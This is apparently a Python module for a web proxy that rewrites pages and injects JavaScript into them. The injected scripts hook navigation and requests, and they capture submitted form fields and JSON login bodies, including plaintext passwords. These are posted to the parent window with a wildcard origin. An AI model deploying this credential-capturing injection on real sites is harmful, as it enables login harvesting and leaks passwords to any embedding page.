from __future__ import annotations

import json
from typing import Dict, List, Tuple
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, unquote

from bs4 import BeautifulSoup

from app.validators import validate_allowed_domain

PROXY_PATH = "/browser/go"


def resolve_real_url(url: str) -> str:
    if PROXY_PATH in url and "url=" in url:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        if query.get("url"):
            return unquote(query["url"][0])
    return url


def _proxy_link(target_url: str, session_id: str) -> str:
    query = urlencode({"url": target_url, "sid": session_id})
    return f"{PROXY_PATH}?{query}"


def _is_navigable(url: str) -> bool:
    parsed = urlparse(url)
    return parsed.scheme in {"http", "https"} and bool(parsed.hostname)


def _abs_url(page_url: str, ref: str) -> str:
    return urljoin(page_url, ref.strip())


def _fix_asset_urls(soup: BeautifulSoup, page_url: str) -> None:
    """Load JS/CSS/images from real site — not via localhost (fixes blank page)."""
    for tag in soup.find_all(["script", "img", "source", "video", "audio"]):
        if tag.get("src"):
            ref = tag["src"].strip()
            if ref and not ref.lower().startswith(("data:", "javascript:", "#")):
                tag["src"] = _abs_url(page_url, ref)

    for tag in soup.find_all("link", href=True):
        href = tag["href"].strip()
        rel = tag.get("rel") or []
        rel_text = " ".join(rel).lower() if isinstance(rel, list) else str(rel).lower()
        if href and (
            "stylesheet" in rel_text
            or "icon" in rel_text
            or "preload" in rel_text
            or href.endswith((".css", ".woff2", ".woff", ".ttf"))
        ):
            tag["href"] = _abs_url(page_url, href)


def _proxy_iframes(soup: BeautifulSoup, page_url: str, session_id: str) -> None:
    for tag in soup.find_all("iframe", src=True):
        ref = tag["src"].strip()
        if not ref or ref.lower().startswith(("data:", "javascript:")):
            continue
        absolute = _abs_url(page_url, ref)
        if _is_navigable(absolute):
            try:
                validate_allowed_domain(absolute)
                tag["src"] = _proxy_link(absolute, session_id)
            except ValueError:
                tag["src"] = absolute


def _inject_navigation_guard(soup: BeautifulSoup, page_url: str, session_id: str) -> None:
    parsed = urlparse(page_url)
    site_origin = f"{parsed.scheme}://{parsed.netloc}"
    guard = soup.new_tag("script")
    guard.string = f"""
(function() {{
  var SID = {json.dumps(session_id)};
  var PROXY = {json.dumps(PROXY_PATH)};
  var SITE = {json.dumps(site_origin)};

  function rootDomain(host) {{
    var parts = (host || '').split('.');
    if (parts.length <= 2) return host;
    return parts.slice(-2).join('.');
  }}

  function shouldProxyUrl(u) {{
    try {{
      var site = new URL(SITE);
      if (u.hostname === site.hostname) return true;
      var siteRoot = rootDomain(site.hostname);
      var urlRoot = rootDomain(u.hostname);
      if (siteRoot && urlRoot && siteRoot === urlRoot) return true;
    }} catch (e) {{}}
    return false;
  }}

  function proxyUrl(target) {{
    if (!target || String(target).charAt(0) === '#') return target;
    if (String(target).indexOf('javascript:') === 0) return target;
    try {{
      var u = new URL(target, SITE);
      if (!shouldProxyUrl(u)) return target;
      if (u.pathname.indexOf(PROXY) === 0) return u.href;
      return PROXY + '?sid=' + encodeURIComponent(SID) + '&url=' + encodeURIComponent(u.href);
    }} catch (e) {{ return target; }}
  }}

  function wrapFetch() {{
    if (!window.fetch) return;
    var orig = window.fetch;
    window.fetch = function(input, init) {{
      try {{
        var url = typeof input === 'string' ? input : (input && input.url);
        var proxied = proxyUrl(url);
        if (proxied && proxied !== url) {{
          if (typeof input === 'string') return orig(proxied, init);
          return orig(new Request(proxied, input), init);
        }}
      }} catch (e) {{}}
      return orig(input, init);
    }};
  }}

  function wrapXHR() {{
    var open = XMLHttpRequest.prototype.open;
    var send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url) {{
      this.__ltMethod = method;
      this.__ltUrl = url;
      var args = Array.prototype.slice.call(arguments);
      args[1] = proxyUrl(url);
      return open.apply(this, args);
    }};
    XMLHttpRequest.prototype.send = function(body) {{
      try {{
        var url = this.__ltUrl || '';
        var method = (this.__ltMethod || 'GET').toUpperCase();
        if (body && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {{
          var fields = {{}};
          try {{
            if (typeof body === 'string' && body.charAt(0) === '{{') {{
              fields = JSON.parse(body);
            }}
          }} catch (e) {{}}
          var hasPass = Object.keys(fields).some(function(k) {{
            return /pass|pwd/i.test(k);
          }});
          if (hasPass) {{
            window.parent.postMessage({{
              type: 'browser-api-login-captured',
              action: proxyUrl(url) || url,
              method: method,
              fields: fields,
              pageUrl: window.location.href
            }}, '*');
          }}
        }}
      }} catch (e) {{}}
      return send.apply(this, arguments);
    }};
  }}

  function wrapHistory() {{
    ['pushState', 'replaceState'].forEach(function(fn) {{
      var orig = history[fn];
      history[fn] = function(state, title, url) {{
        if (url) url = proxyUrl(url);
        return orig.call(this, state, title, url);
      }};
    }});
  }}

  document.addEventListener('click', function(e) {{
    var a = e.target.closest && e.target.closest('a[href]');
    if (!a) return;
    var href = a.getAttribute('href');
    if (!href || href.charAt(0) === '#') return;
    var proxied = proxyUrl(href);
    if (proxied && proxied.indexOf(PROXY) >= 0 && a.href !== proxied) {{
      e.preventDefault();
      location.assign(proxied);
    }}
  }}, true);

  try {{
    var desc = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
    if (desc && desc.set) {{
      Object.defineProperty(Location.prototype, 'href', {{
        get: desc.get,
        set: function(v) {{ desc.set.call(this, proxyUrl(v)); }},
        configurable: true
      }});
    }}
    var a = Location.prototype.assign;
    Location.prototype.assign = function(u) {{ return a.call(this, proxyUrl(u)); }};
    var r = Location.prototype.replace;
    Location.prototype.replace = function(u) {{ return r.call(this, proxyUrl(u)); }};
  }} catch (e) {{}}

  wrapHistory();
  wrapFetch();
  wrapXHR();
}})();
"""
    head = soup.find("head")
    if head:
        head.insert(0, guard)


def rewrite_html(html: str, page_url: str, session_id: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    page_url = resolve_real_url(page_url)

    head = soup.find("head")
    if not head:
        head = soup.new_tag("head")
        if soup.html:
            soup.html.insert(0, head)
        else:
            soup.insert(0, head)

    if not soup.find("meta", attrs={"name": "viewport"}):
        viewport = soup.new_tag(
            "meta",
            attrs={"name": "viewport", "content": "width=device-width, initial-scale=1.0"},
        )
        head.insert(0, viewport)

    # Relative /assets/... must resolve to the real website, not localhost.
    parsed = urlparse(page_url)
    base_href = f"{parsed.scheme}://{parsed.netloc}/"
    existing_base = soup.find("base")
    if existing_base:
        existing_base["href"] = base_href
    else:
        base_tag = soup.new_tag("base", href=base_href)
        head.insert(0, base_tag)

    _fix_asset_urls(soup, page_url)
    _proxy_iframes(soup, page_url, session_id)
    _inject_navigation_guard(soup, page_url, session_id)

    for tag in soup.find_all("meta"):
        http_equiv = (tag.get("http-equiv") or "").lower()
        if http_equiv == "refresh" and tag.get("content"):
            parts = tag["content"].split("url=", 1)
            if len(parts) == 2:
                target = parts[1].strip().strip("'\"")
                absolute = _abs_url(page_url, target)
                try:
                    validate_allowed_domain(absolute)
                    tag["content"] = parts[0] + "url=" + _proxy_link(absolute, session_id)
                except ValueError:
                    pass

    for tag in soup.find_all("a", href=True):
        href = tag["href"].strip()
        if href.startswith("#") or href.lower().startswith(("javascript:", "mailto:", "tel:")):
            continue
        absolute = _abs_url(page_url, href)
        if _is_navigable(absolute):
            try:
                validate_allowed_domain(absolute)
                tag["href"] = _proxy_link(absolute, session_id)
            except ValueError:
                tag["href"] = absolute

    for tag in soup.find_all("form"):
        action = tag.get("action") or page_url
        absolute = _abs_url(page_url, action)
        if _is_navigable(absolute):
            try:
                validate_allowed_domain(absolute)
                tag["action"] = _proxy_link(absolute, session_id)
            except ValueError:
                tag["action"] = absolute
        if not tag.get("method"):
            tag["method"] = "post"

    style = soup.new_tag("style")
    style.string = "html,body{overflow:auto!important;min-height:100vh;margin:0;}"
    head.append(style)

    recorder = soup.new_tag("script")
    recorder.string = """
    function notifyApiLogin(url, method, body) {
      try {
        if (!body) return;
        var fields = {};
        if (typeof body === 'string' && body.charAt(0) === '{') {
          fields = JSON.parse(body);
        } else if (body instanceof FormData) {
          body.forEach(function(v, k) { fields[k] = v; });
        }
        var hasPass = Object.keys(fields).some(function(k) {
          return /pass|pwd/i.test(k);
        });
        if (!hasPass) return;
        window.parent.postMessage({
          type: 'browser-api-login-captured',
          action: url,
          method: (method || 'POST').toUpperCase(),
          fields: fields,
          pageUrl: window.location.href
        }, '*');
      } catch (err) {}
    }

    window.addEventListener('submit', function(e) {
      try {
        const form = e.target;
        if (!form || form.tagName !== 'FORM') return;
        const data = {};
        new FormData(form).forEach((v, k) => { data[k] = v; });
        window.parent.postMessage({
          type: 'browser-login-captured',
          action: form.action,
          method: (form.method || 'GET').toUpperCase(),
          fields: data,
          pageUrl: window.location.href
        }, '*');
      } catch (err) {}
    }, true);
    """
    if soup.body:
        soup.body.append(recorder)
    else:
        body = soup.new_tag("body")
        body.append(recorder)
        if soup.html:
            soup.html.append(body)

    return str(soup)


def extract_form_fields(form_data: Dict[str, str]) -> Tuple[str, str, Dict[str, str]]:
    password_field = ""
    username_field = ""

    for key in form_data:
        lowered = key.lower()
        if "pass" in lowered or "pwd" in lowered or lowered == "password":
            password_field = key

    for key in form_data:
        if key == password_field:
            continue
        lowered = key.lower()
        if any(x in lowered for x in ("user", "email", "login", "account")):
            username_field = key

    if not password_field:
        raise ValueError("Form không có trường password")

    if not username_field:
        for key in form_data:
            if key != password_field and not key.startswith("_"):
                username_field = key
                break

    if not username_field:
        raise ValueError("Không xác định được trường username")

    return username_field, password_field, form_data
